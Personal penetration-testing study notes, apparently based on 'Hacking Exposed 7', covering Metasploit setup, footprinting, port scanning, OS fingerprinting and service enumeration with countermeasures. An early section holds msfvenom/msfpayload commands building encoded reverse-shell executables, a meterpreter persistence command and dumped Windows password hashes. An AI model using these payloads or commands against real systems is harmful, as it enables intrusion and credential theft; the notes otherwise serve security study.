# rules
  * no harm
  * defiine and honor boundaries
  * consider contermeasures only after haking is complete
  * get  agreement in advance
  * document everything

# start postgres db
  * Metasploit uses PostgreSQL as its database so it needs to be launched first.
    ```
      service postgresql start
      ** You can verify that PostgreSQL is running by checking the output of ss -ant and making sure that port 5432 is listening.

      State Recv-Q Send-Q Local Address:Port Peer Address:Port
      LISTEN 0 128 :::22 :::*
      LISTEN 0 128 *:22 *:*
      LISTEN 0 128 127.0.0.1:5432 *:*
      LISTEN 0 128 ::1:5432 :::*
    ```
  * Initialise the Metasploit PostgreSQL Database

      With PostgreSQL up and running, we next need to create and initialize the msf database.
      ```
      pg_ctl init -D /var/db/postgresql/defaultdb/
      pg_ctl -D /var/db/postgresql/defaultdb -l /var/db/postgresql/defaultdb/logfile start
      su - postgres -c "pg_ctl -D /var/db/postgresql/defaultdb/ start"

      psql
      create user root;
      create database ms;

      msfdb init
      ```
  * Launch msfconsole in Kali

    Now that the PostgreSQL service is up and running and the database is initialized, you can launch msfconsole and verify database connectivity with the db_status command as shown below.
    ```
    msfconsole
    msf > db_status
    [*] postgresql connected to msf3
    msf >

    umount -a -t cifs -l

    apt-cdrom -d=/dev/sr0 add

    traceroute www.google.com 
      -f 8   //ttl
      -w 2   //wait time
      -q 4   // query count
      -n     // not use hostname,use ip address instead
     ```
  * wireshare
      ip.src == 192.168.11.1
      udp.port==68 or udp.port==67


  * Metasploit
      [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
      [-] This script requires the use of a SYSTEM user context (hint: migrate into service process)
         find a system process get pid
         migrate pid

    Administrator:500:c0ad129bd4e0e675ab0b09b894a430a5:64f2a499e4fc2846acfaa3c2381ed559:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    HelpAssistant:1000:bc156931ebe3fa457e2260fe8b464b5c:04d8217f38d4aab7c2ad9ee56ed93b01:::
    SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2f99608b6d63ec34d85538bdef5916e1:::

    [*] Authenticating to 10.0.128.4:445|WORKGROUP as user 'Administrator'...
    
    [-] FAILED! The remote host has only provided us with Guest privileges. 
        Please make sure that the correct username and password have been provided. 
        Windows XP systems that are not part of a domain will only provide Guest privileges to network logins by default.

    * run scraper
      > timeout
    * pessistent:
      > run persistence -X -i 50 -p 443 -r ip
        
    * payload:  
    ```  
      msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=31337 -f exe -o /var/www/payload1.exe

      msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 X > /var/www/payload1.exe

      msfpayload windows/shell_reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -t exe > /var/www/payload2.exe 

       msfpayload windows/meterpreter/reverse_tcp lhost=10.0.128.0 lport=33134 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -t raw -c 5 | \
        msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
      ```

  * Nping 0.7.30 ( https://nmap.org/nping )
    EXAMPLES:
    ```
      nping scanme.nmap.org
      nping --tcp -p 80 --flags rst --ttl 2 192.168.1.1
      nping --icmp --icmp-type time --delay 500ms 192.168.254.254
      nping --echo-server "public" -e wlan0 -vvv
      nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack
    ```
    SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES
    ```
    nping --arp --arp-type arp-reply --arp-sender-mac a1:8f:16:54:c2:38 --arp-sender-ip 192.168.43.1 --arp-target-mac 84:4b:f5:85:91:8e --arp-target-ip 192.168.43.206 192.168.43.206
    echo "this is a test from all of you" |  ncat -u 127.0.0.1 4913
    ```

* rce
  arbitrary code execution

* base64:
  ```
  Text content 	M 	a 	n
  ASCII 	77 (0x4d) 	97 (0x61) 	110 (0x6e)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	1 	1 	0 	0 	0 	0 	1 	0 	1 	1 	0 	1 	1 	1 	0
  Index 	19 	22 	5 	46
  Base64-encoded 	T 	W 	F 	u
  ```
  As this example illustrates, Base64 encoding converts three octets into four encoded characters.
  When the number of bytes to encode is not divisible by three, Add extra bytes with value zero 
  ```
  Text content 	M 		
  ASCII 	77 (0x4d) 	0 (0x00) 	0 (0x00)
  Bit pattern 	0 	1 	0 	0 	1 	1 	0 	1 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0 	0
  Index 	19 	16 	0 	0
  Base64-encoded 	T 	Q 	= 	=
  ```

* hack expose 7
  * footprint
    * methods
      1. Internet
        - domain name
        - network 
        - specific network address reachable via Internet
        - system arch
        - acl
        - ids
        - system enumeration
        - dns hostname 
      2. intranet
        - above 
        - network protocols
      3. remote Access
        - tel
        - remote sys type
        - authentication mechanism
        - vpns and related protocols(PPTP, IPsec)
      4. extranet
        - domain name
        - connection src and dest
        - type of connection
        - access control mechanism
    * steps
     1. activity scope
     2. proper authorization
     3. publicity available info
      - web pages
        - website mirror tools
          - wget
            wget -r -nH --cut-dirs=1 --level=6 http://www.742bb.com/
            find -type f -name "*" 
          - teleport pro 
      - related organizations
        - comments on code
      - location
        - google earth
        - google maps
      - employee info
        - www.whitepages.com
        - http://www.yellowpages.com/
        - http://www.411.com/
        - blackbookonline.info
        - peoplesearch.com
        - bigyellow.com
        - whowhere.com
        - ussearch.com
        - usafind.com
      - current events
        - sce
      - privacy, security polices and technical details
      - archived info
        - archive.org
          http://www.baidu.com/robots.txt
      - search engine and data relationship
        - google
        - bing
        - dogpile.com
        - ask.com
        - http://hackersforcharity.org/ghdb/
        - https://www.exploit-db.com/google-hacking-database/
        - hotbot.com
        - excite.com
        - [sitedigger](https://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx#)
        - [FOCA](https://www.elevenpaths.com/labstools/foca/index.html#)
      - other info of interest
        practice
      - contermeasures
        - faqs.org/rfcs/rfc2196.html
    4. whois and dns enumeration
        - ICANN(Internet corporation for assigned names and numbers)[icann.org]
          - Internet domain names
          - ip address numbers
          - protocol parameters and port numbers
          - coordinate stable of root dns system
        - ICANN includes:
          - Address Supporting Organization(ASO),.aso.icann.org
          - Generic Names Supporting Organization(GNSO), gnso.icann.org
          - Country Code Domain Name Supporting Organization (CCNSO), ccnso.icann.org
                 ip
          - ASO ----> Regional Internet Registries (RIRs) -->ISPs, National Internet Registries (NIRs),Local Internet Registries (LIRs) 
        - whois
          - whois.iana.org
          - www.allwhois.com -> https://www.markmonitor.com/
          - superscan, netscan...
          - jwhois
      - contermeasures
        - pay for domain to keep your contact info secret
    5. dns interrogation
      - DNS zone transfer:allows a secondary master server to update its zone database fromthe primary master
        1. This vulnerability allows for significant info rmation gathering on a target.
        2. It is often the springboard to attacks that would not be present without it.
        3. Believe it or not, you can find many DNS servers that still allow this feature.
      - tools
        - nslookup: nslookup set type=any 
        - host:host -l -v -t any bing.com
        - dig
        - dnsrecon, dnsenum, dnsmap, 
        - fierce
      - contermeasures
        - configure named.conf or Microsoft's dns to restrict or disable zone transfer
        - deny all authorized inbound  connection to TCP on port 53
          - query throught UDP on port 53
          - zone transfer TCP on port 53
          - rfc states that dns queries  > 512B via tcp 
          - use TSIGs(transition signatures) allows only trusted host transfer zone info.  rfc2845
    6. network reconnaissance
      - traceroute -p53 -I www.google.com
      - contermeasures
        - nids
          - snort
        - ips

  2. scanning
    -arp host discovery
      - arp-scan
      - nmap -sn -PR 192.168.1.0/24
      - [cain](oxid.it/cain.html)

    - icmp host discovery
      - ping -c 2 192.168.1.1
      - nping -c 2 --icmp --icmp-type echo 192.168.1.1
      - nmap -sn -PE --send-ip 192.168.1.0/24 
        * PE echo request
        * PM mask
        * PP timestamp
      - superscan

    - tcp/udp host discovery
      - nmap -Pn -Ss -p 22 --open 192.168.1.0/24
      - superscan
      - nping --tcp -p 21 --ttl 3 --flags syn 192.168.1.0/24

    - contermeasures
      - fireware
      - detecte tools(Unix)
        1. [scanlogd](http://www.openwall.com/scanlogd)
        2. [Courtney](https://packetstormsecurity.com/files/12903/courtney-1.3.tar.Z.html)
        3. ippl
        4. protolog
      - icmp
        - allow only ECHO_REPLY, HOST_UNREACHABLE, TIME_EXCEEDED packet to dmz 
        - limit icmp traffic using acl

      - tcp/udp -- decide which service to run on host
        - port scan identify folling things:
          1. tcp/udp service on system
          2. os type
          3. application or version of a service
        - scan type (ietf.org/rfc/rfc0793.txt): sys connect scans works against all os
          - tcp connect: -sT
          - tcp SYN : -sS
          - tcp FIN: -sF send FIN to target, send back RST on unix-base tcp/ip stacks
          - tcp XMAS tree: send FIN URG PSH to target port, target should sent RST (The term derives from a fanciful image of 
            each little option bit in a header being represented by a different-colored light bulb, all turned on, as in, 
            "the packet was lit up like a Christmas tree."[1] It can also be known as a kamikaze packet, nastygram, or lamp test segment.)
          - tcp NULL: turn off all flags, target should send back RST 
          - tcp ACK: mapout firewall rulesets
            1. a simple packet filter allowing only established connections
            2. a stateful firewall performing advanced packet filtering
          - tcp windows scan: detect open as well as filterd/nonfiltered ports on some systems(AIX, FreeBSD) due to an anomaly
            reported TCP windows size
          - tcp RPC scan: detect and identify rpc ports and their associated program and version
          - udp scan: target respond 'ICMP port UNREACHABLE" --> port closed , else reduce port is open , but as udp is connectionless 
            accuracy is affected by utilization or filter of target network, it can also be very slow

        - identify TCP and UDP services running
          - namp -sS 192.168.1.1 -oN
            - –f option to fragment the packets, make it harder for access control devices 
              or intrusion detection systems (IDS) to detect the scan
            - -D launch decoy scans at the same time real scan is launched, the decoy address should be alive
              otherwise, SYN-flood scan may happen to target system
            - nmap -sS 192.168.2.1 -D 192.168.2.254 -vv
          - [ftp bounce scan](ietf.org/rfc/rfc0959.txt)
            - lauch connections throught a ftp server by abusing the support for proxy ftp connection
            - -b options in nmap , be very slow, ftp server must :
              1. have readable and writable dir such as /incoming
              2. allow nmap use bogus port info to it via PORT method
              3. supper scan
          - superscan
          - [ScanLine](https://www.mcafee.com/us/downloads/free-tools/scanline.aspx?_ga=1.159898104.439281320.1486605079#)
            ```
            sl -v -t 21,22,23,25 -u 53,135,139 192.168.1.1
            ```
          - netcat(nc): 
            ```
            nc -v -z -w 2 192.168.1.1 1-140
            ```

        - port scan countermeasures
          - ids : snort
          - unix: scanlogd, windows: attacker
          - firewall: configure alerts to fire in real time via e-mail, use threshold logging 
          - disable unneccesary services
      
      - detect os
        - guess from opened ports
          - 135, 139, 445 netbios
          - 3389 rdp
          - 22 ssh 
          - unix: rpc nfs 
        - [active stack fingerprint](https://nmap.org/nmap-fingerprinting-article.txt)
          - fin probe: windows send back fin/ack
          - bogus flag probe: undefined flag is set to tcp head of a sys packet, some such as linux set the flags 
            and send to back
          - ISN sampling: initial sequence number choose by tcp implemention is different
          - DF monitor: don't fragment is set by some os to enhance performance, of which monitor can be done to 
            identify os type
          - tcp initial window size: for some stack implemention, the size is unique
          - ACK value: some return it back, others return seq number +1
          - ICMP error message quenching: [RFC 1812](ietf.org/rfc/rfc1812.txt) limit rate at error msg send, by
            sending UDP packets to some random high-numbered port, you can count the rate 
          - ICMP message quota: different quoto info are send in different os
          - ICMP error message -- echo integrity: some may alter ip address
          - TOS: For “ICMP PORT UNREACHABLE” messages, the TOS(type of service) is examined. Most stack implementations use 0, 
              but this can vary.
          - fragmentation handling: “Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection,”
            different stacks handle overlapping fragments differently
          - tcp options: By sending a packet with multiple options set—such as no operation, maximumsegment size, 
            window scale factor,and timestamps—you can make some assumptions about the target operating system
          ```
          nmap -O 192.168.1.1
          ```

        - contermeasures
          - change system settings:TCP_DROP_SYNFIN in FreeBSD
          - fireware 

      - [passive os detection](http://old.honeynet.org/papers/finger/)
        - passive stack fingerprint
          - tcp areas :
           - TTL - What the operating system sets the Time To Live on the outbound packet
           - Window Size - What the operating system sets the Window Size at.
           - DF - Does the operating system set the Don't Fragment bit.
           - TOS - Does the operating system set the Type of Service, and if so, at what.

  3. enumeration
    - service fingerprinting
      ```
        nmap -sS 192.168.1.1 -p 1417
        nmap -sV 192.168.1.1 -p 1417
        amap another tool 
      ```
    - vulnerability scanners
      - nessus
      - openvas
      - nse:(nmap scripting engine)
        ```
          –sC to run a set of default scripts : --script=default
        nmap -Pn --script smb-check-vulns --script-args=unsafe=1 192.168.2.1

        Starting Nmap 6.47 ( http://nmap.org ) at 2017-02-10 16:47 CST
        Nmap scan report for 192.168.2.1
        Host is up (0.00019s latency).
        Not shown: 995 filtered ports
        PORT     STATE SERVICE
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        5678/tcp open  rrac
        5900/tcp open  vnc
        MAC Address: 00:50:56:C0:00:08 (VMware)

        Host script results:
        | smb-check-vulns: 
        |   Conficker: Likely CLEAN; access was denied.
        |   |  If you have a login, try using --script-args=smbuser=xxx,smbpass=yyy
        |   |  (replace xxx and yyy with your username and password). Also try
        |   |_ smbdomain=zzz if you know the domain. (Error NT_STATUS_ACCESS_DENIED)
        |   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
        |   MS06-025: NO SERVICE (the Ras RPC service is inactive)
        |_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)

        Nmap done: 1 IP address (1 host up) scanned in 10.25 seconds
        ```
      - countermeasures
        - ips
        - ids
    
    - basic banner grabbing
      - telnet 192.168.1.2 22
      - nc -nvv 192.168.1.2 80 < nudge.txt
        ```
        cat nudge.txt
        GET http://192.168.2.131 HTTP/1.0
        

        ```

      - countermeasures 
        - shutdown unneccessary services
        - for critical service can't be turned off, try not show vendors or version in banner

    - enumerating common network services
      - ftp 21
        ```
        ftp> open ftp.ubuntu.com
        Connected to ftp.ubuntu.com.
        220 FTP server (vsftpd)
        Name (ftp.ubuntu.com:root): anonymous
        331 Please specify the password.
        Password:
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.
        ftp> ls
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        drwxr-xr-x    7 999      999          4096 Feb 10 10:04 ubuntu
        226 Directory send OK.
        ftp> cd ubuntu
        250 Directory successfully changed.
        ftp> pwd
        257 "/ubuntu" is the current directory
        ftp> ls
        200 PORT command successful. Consider using PASV.
        150 Here comes the directory listing.
        drwxrwxr-x   37 999      999          4096 Oct 18 08:56 dists
        drwxr-xr-x    2 999      999        143360 Feb 10 09:54 indices
        -rw-r--r--    1 999      999      15297784 Feb 10 10:08 ls-lR.gz
        drwxrwxr-x    6 999      999          4096 Feb 27  2010 pool
        drwxr-xr-x    3 999      999          4096 Jun 28  2013 project
        lrwxrwxrwx    1 999      999             1 Nov 24  2010 ubuntu -> .
        226 Directory send OK.
        ```

      - ftp enumeration countermeasures
        - always use secure sftp(via ssh), ftps(via ssl)
        - be skeptical about anonymous login, deny upload files
        - maybe use http 

      - telnet enumeration tcp port 23

      - telent countermeasures
        - use SSH

      - SMTP 25
        - sendmail
        - postfix
        ```
          telnet 192.168.2.131 25
          220 centos.163.com ESMTP Postfix
          vrfy root
          252 2.0.0 root
          expn test
          502 5.5.2 Error: command not recognized
          quit
          221 2.0.0 Bye


          Connection to host lost.
        ```
      
      - smt enumeration countermeasures
        - turn off if posssible
        - configure to disable some commands(EXPN, VRFY) being used by nonprivileged user

      - DNS tcp/udp 53
        - zone transfers
          ```
          dig @192.168.2.131 dob.com axfr
            ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 dob.com axfr
            ; (1 server found)
            ;; global options: +cmd
            dob.com.		172800	IN	SOA	ns1.dob.com. centos.dob.com. 2003080800 43200 900 1814400 7200
            dob.com.		172800	IN	NS	ns1.dob.com.
            dob.com.		1814400	IN	MX	10 mail.dob.com.
            centos.dob.com.		172800	IN	CNAME	ns1.dob.com.
            mail.dob.com.		172800	IN	A	192.168.2.131
            ns1.dob.com.		172800	IN	A	192.168.2.131
            www.dob.com.		172800	IN	A	192.168.2.131
            dob.com.		172800	IN	SOA	ns1.dob.com. centos.dob.com. 2003080800 43200 900 1814400 7200
            ;; Query time: 1 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Sun Feb 12 02:35:04 2017
            ;; XFR size: 8 records (messages 1, bytes 209)


          C:\Windows\system32>nslookup
          Default Server: 192.168.1.1 
          Address:  192.168.1.1

          > server 192.168.2.131
          Default Server:  [192.168.2.131]
          Address:  192.168.2.131

          > ls -d dob.com
          [[192.168.2.131]]
          dob.com.                       SOA    ns1.dob.com centos.dob.com. (2003080800 4
          3200 900 1814400 7200)
          dob.com.                       NS     ns1.dob.com
          dob.com.                       MX     10   mail.dob.com
          centos                         CNAME  ns1.dob.com
          mail                           A      192.168.2.131
          ns1                            A      192.168.2.131
          www                            A      192.168.2.131
          dob.com.                       SOA    ns1.dob.com centos.dob.com. (2003080800 4
          3200 900 1814400 7200)
          >
          ```

        - bind enumeration 
          ```
          dig @192.168.2.131 version.bind txt chaos
          ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 version.bind txt chaos
          ; (1 server found)
          ;; global options: +cmd
          ;; Got answer:
          ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62424
          ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 0
          ;; WARNING: recursion requested but not available

          ;; QUESTION SECTION:
          ;version.bind.			CH	TXT

          ;; ANSWER SECTION:
          version.bind.		0	CH	TXT	"9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4"

          ;; AUTHORITY SECTION:
          version.bind.		0	CH	NS	version.bind.

          ;; Query time: 0 msec
          ;; SERVER: 192.168.2.131#53(192.168.2.131)
          ;; WHEN: Sun Feb 12 03:50:11 2017
          ;; MSG SIZE  rcvd: 95
          ```

        - dns cache snooping
          
        - dns enumeration
          - dnsenum
          - fierce.pl
          - http://centralops.net/
        
        - dns enumeraton countermeasures
          - windows dns config mmc computer management
            '''
             \Services and Applications\DNS\[server_name]\Forward Lookup Zones\[zone_name] 
            ```
          - named configure acl and allow-transfor{};

          - blocking bind version.bind request
            ```
            dig @192.168.2.131 version.bind choas txt

            ; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.4 <<>> @192.168.2.131 version.bind choas txt
            ; (1 server found)
            ;; global options: +cmd
            ;; Got answer:
            ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 30291
            ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

            ;; QUESTION SECTION:
            ;version.bind.			IN	A

            ;; Query time: 4005 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Mon Feb 13 03:11:17 2017
            ;; MSG SIZE  rcvd: 30

            ;; Got answer:
            ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 12958
            ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

            ;; QUESTION SECTION:
            ;choas.				IN	TXT

            ;; Query time: 3355 msec
            ;; SERVER: 192.168.2.131#53(192.168.2.131)
            ;; WHEN: Mon Feb 13 03:11:26 2017
            ;; MSG SIZE  rcvd: 23
            ```
          
          - disable dns caching snooping
            Luis Grangeia
